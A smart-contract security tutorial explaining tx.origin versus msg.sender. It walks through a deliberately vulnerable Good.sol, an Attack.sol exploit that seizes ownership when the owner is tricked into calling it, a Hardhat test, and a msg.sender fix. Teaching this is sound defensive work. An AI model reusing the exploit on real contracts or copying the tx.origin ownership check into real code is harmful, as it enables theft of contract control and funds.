---
description: 🧠 tx.origin vs msg.sender
---

# tx.origin

**`tx.origin` ** is a global variable which returns the address that created the original transaction.

&#x20;It is kind of **similar** to **`msg.sender`**, but with an important caveat.&#x20;

We will learn how incorrect use of tx.origin could lead to security vulnerabilities in smart contracts.

### What is tx.origin?

**`tx.origin`** is a **global variable** which returns the address of the account which sent the transaction. Now you might be wondering then **what is `msg.sender`** 🤔.&#x20;

The difference is that **`tx.origin` refers to the original external account** (which is the user) that started the transaction and **`msg.sender` is the immediate account** that called the function and **it can be an external account or another contract calling the function.**

So for example, if User calls **Contract A**, which then calls **Contract B** within the same transaction, **`msg.sender`** will be equal to **`Contract A`** when checked from inside **`Contract B`**. However, **`tx.origin`** will be the ** `User` ** regardless of where you check it from.

#### What will happen?

There will be two smart contracts - **`Good.sol`** and **`Attack.sol`**.&#x20;

`Good.sol`. Initially the owner of `Good.sol` will be a good user.&#x20;

Using the attack function `Attack.sol` will be able to change the owner of `Good.sol` to itself.

### ⚒️ Contract

Note All of these commands should work smoothly . If you are on windows and face Errors Like **`Cannot read properties of null (reading 'pickAlgorithm')`** Try Clearing the NPM cache using **`npm cache clear --force`**.

**Setup a Hardhat project**

```shell
mkdir tx-origin
cd tx-origin
npm init --yes
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox

# bootstrap the hardhat project
npx hardhat
```

Make sure you select **`Create a Javascript Project`**

Create a new file inside the **`tx-origin/contracts`**directory and call it **`Good.sol`**

This is a simple version of **Ownable.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Good {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setOwner(address newOwner) public {
        require(tx.origin == owner, "Not owner");
        owner = newOwner;
    }
}
```

****

Create a new file inside the **`tx-origin/contracts`**directory and call it **`Attack.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Good.sol";

contract Attack {
    Good public good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOwner(address(this));
    }
}
```

**``**

#### Writing the Test

Create a new file inside the **`.../test`**directory and call it **`attack.js`**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("tx.origin", function () {
  it("Attack.sol will be able to change the owner of Good.sol", async function () {
    // Get one address
    const [_, addr1] = await ethers.getSigners();

    // Deploy the good contract
    const Good = await ethers.getContractFactory("Good");
    const goodContract = await Good.connect(addr1).deploy();
    await goodContract.deployed();
    console.log("Good Contract's Address:", goodContract.address);

    // Deploy the Attack contract
    const Attack = await ethers.getContractFactory("Attack");
    const attackContract = await Attack.deploy(goodContract.address);
    await attackContract.deployed();
    console.log("Attack Contract's Address", attackContract.address);

    let tx = await attackContract.connect(addr1).attack();
    await tx.wait();

    // Now let's check if the current owner of Good.sol is actually Attack.sol
    expect(await goodContract.owner()).to.equal(attackContract.address);
  });
});
```

The attack will happen as follows, initially **`addr1`** will deploy **`Good.sol`** and will be the owner but the attacker will somehow fool the user who has the private key of **`addr1` ** to call the **`attack`** function with **`Attack.sol`.**

When the user calls **`attack` ** function with **`addr1`**, **`tx.origin` is set to `addr1`**. `attack` function further calls **`setOwner`** function of **`Good.sol`** which first checks if `tx.origin` is indeed the owner which is **`true` ** because the original transaction was indeed called by `addr1`. After verifying the owner, it sets the owner to **`Attack.sol`**

And thus attacker is successfully able to change the owner of `Good.sol` 🤯

#### Testing the attack

To run the test, in your terminal pointing to the root directory of this level execute the following command

```sh
npx hardhat test
```



### Real Life Example

While this may seem obvious to most of you, as `tx.origin` isn't something you see being used at all, some developers do make this mistake.&#x20;

You can read about the [THORChain Hack #2 here](https://rekt.news/thorchain-rekt2/) where users lost millions in $RUNE due to an attacker being able to get approvals on $RUNE token by sending a fake token to user's wallets, and approving that token for sale on Uniswap would transfer $RUNE from the user's wallet to the attacker's wallet because THORChain used **`tx.origin` for transfer checks instead of `msg.sender`.**

### 👮 Prevention

You should use **`msg.sender`** instead of **`tx.origin`** to not let this happen. There is almost never a good use case for **`tx.origin` ** except in very specific cases - and in those times, be VERY careful.

Example:

<pre class="language-solidity"><code class="lang-solidity">function setOwner(address newOwner) public {    
<strong>    require(msg.sender == owner, "Not owner" );    
</strong>    owner = newOwner;
}
</code></pre>
